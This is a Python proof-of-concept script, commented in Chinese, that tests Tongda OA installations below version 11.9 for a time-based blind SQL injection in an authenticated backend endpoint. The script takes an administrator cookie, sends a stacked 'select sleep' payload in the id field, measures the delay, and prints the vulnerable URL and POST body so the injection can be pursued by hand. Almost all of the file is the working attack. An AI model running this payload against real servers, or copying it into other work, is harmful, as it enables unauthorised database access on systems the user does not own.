import requests
import sys
import time
import datetime

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'

s = requests.session() # 初始化requests.session()会话对象，保持cookie

def sql_time_injection(target_url,cookie): # 通达11.9后台SQL注入 注意请求的/
    url = target_url + "general/appbuilder/web/portal/workbench/upsharestatus"
    data = {'uid':'1','status':'1','id':'1;select sleep(3)'}
    headers = {'Cookie': cookie}
    try:
        time1 = datetime.datetime.now()
        response = requests.post(url=url,data=data,headers=headers)
        # print(response.text)
        time2 = datetime.datetime.now()
        sec = (time2-time1).seconds
        print(sec)
        if "操作成功" in response.text and sec == 3:
            print(GREEN + '[*] 存在时间盲注漏洞' + END)
            print(GREEN + '自行登录后台抓包填入如下' + END)
            print(GREEN + '目标URL地址为:' + url + END)
            print(GREEN + 'POST值为: ' + 'uid=1&status=1&id=1;select sleep(4)' + END)
        else:
            print(RED + "[-] 不存在该漏洞" + END)
    except:
        pass


def run(host):
    print(CYAN + '[->] 正在测试通达<11.9后台SQL时间盲注漏洞（需要管理员账号）' + END)
    print(("Cookie格式:PHPSESSID=xxxxx"))
    cookie = input(('请输入你的cookie: '))
    sql_time_injection(host, cookie)